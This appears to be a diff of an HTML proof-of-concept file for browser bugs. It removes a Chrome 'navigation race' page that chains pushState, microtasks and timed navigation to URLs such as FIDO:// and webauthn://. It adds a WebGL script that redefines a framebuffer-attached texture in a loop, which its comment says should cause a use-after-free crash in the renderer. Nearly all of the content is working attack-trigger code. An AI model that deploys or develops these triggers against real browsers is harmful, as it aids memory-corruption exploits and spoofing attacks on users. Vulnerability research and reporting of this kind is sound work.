@@ -1,91 +1,84 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<title>Chrome Navigation Race – WORKING PoC</title>
-
-<style>
-body { font-family: sans-serif; }
-#panel {
-  display: none;
-  margin-top: 16px;
-  padding: 12px;
-  border: 2px solid red;
-  background: #fee;
-}
-button {
-  padding: 10px 14px;
-  font-size: 15px;
-}
-pre {
-  background: #111;
-  color: #0f0;
-  padding: 10px;
-  margin-top: 16px;
-  height: 180px;
-  overflow: auto;
-}
-</style>
-</head>
-
+<html>
 <body>
-
-<h2>Chrome Desktop – Navigation Race (Fixed)</h2>
-
-<button id="trigger">Start</button>
-
-<div id="panel">
-  <b>Trusted UI State</b><br>
-  Simulating post‑gesture privileged state
-</div>
-
-<pre id="log"></pre>
-
+<canvas id="c" width="256" height="256"></canvas>
 <script>
-const trigger = document.getElementById('trigger');
-const panel = document.getElementById('panel');
-const logEl = document.getElementById('log');
-
-function log(m) {
-  logEl.textContent += m + "\n";
+const gl = c.getContext("webgl");
+if (!gl) {
+  console.log("WebGL not supported");
+  throw 1;
 }
 
-trigger.onclick = () => {
-  log("[+] click handler entered (user gesture)");
+// ---- setup texture ----
+function makeTex() {
+  const t = gl.createTexture();
+  gl.bindTexture(gl.TEXTURE_2D, t);
+  gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
+  gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
+  gl.texImage2D(
+    gl.TEXTURE_2D,
+    0,
+    gl.RGBA,
+    256,
+    256,
+    0,
+    gl.RGBA,
+    gl.UNSIGNED_BYTE,
+    null
+  );
+  return t;
+}
 
-  // Step 1: mutate history (trusted-looking state)
-  history.pushState({}, "", "/trusted");
-  panel.style.display = "block";
-  log("[+] history.pushState done");
+const tex = makeTex();
 
-  // Step 2: microtask escape
-  Promise.resolve().then(() => {
-    log("[*] microtask");
+// ---- framebuffer ----
+const fb = gl.createFramebuffer();
+gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
+gl.framebufferTexture2D(
+  gl.FRAMEBUFFER,
+  gl.COLOR_ATTACHMENT0,
+  gl.TEXTURE_2D,
+  tex,
+  0
+);
 
-    // Step 3: animation frame escape
-    requestAnimationFrame(() => {
-      log("[*] requestAnimationFrame");
+// ---- draw something ----
+gl.viewport(0, 0, 256, 256);
+gl.clearColor(1, 0, 0, 1);
+gl.clear(gl.COLOR_BUFFER_BIT);
 
-      // Step 4: delayed navigation INSIDE gesture lifetime
-      setTimeout(() => {
-        log("[!] triggering navigation");
+// ---- TRIGGER ----
+// texture is BOTH:
+// 1. render target
+// 2. copyTexImage2D source
+for (let i = 0; i < 1000; i++) {
+  gl.bindTexture(gl.TEXTURE_2D, tex);
 
-        /*
-         * TEST TARGETS (try one at a time):
-         *
-         * location.href = "FIDO://";
-         * location.href = "FiDo://";
-         * location.href = "webauthn://";
-         * location.href = "https://google.com:9090";
-         */
+  // This redefines the texture while it is attached
+  gl.copyTexImage2D(
+    gl.TEXTURE_2D,
+    0,
+    gl.RGBA,
+    0,
+    0,
+    256,
+    256,
+    0
+  );
 
-        location.href = "https://google.com:9090";
+  // force command buffer growth
+  gl.clearColor(Math.random(), 0, 0, 1);
+  gl.clear(gl.COLOR_BUFFER_BIT);
+}
 
-      }, 0);
-    });
-  });
-};
+// keep using framebuffer after redefine
+for (let i = 0; i < 1000; i++) {
+  gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
+  gl.clearColor(0, Math.random(), 0, 1);
+  gl.clear(gl.COLOR_BUFFER_BIT);
+}
+
+console.log("If ASAN enabled, renderer should crash with UAF.");
 </script>
-
 </body>
 </html>
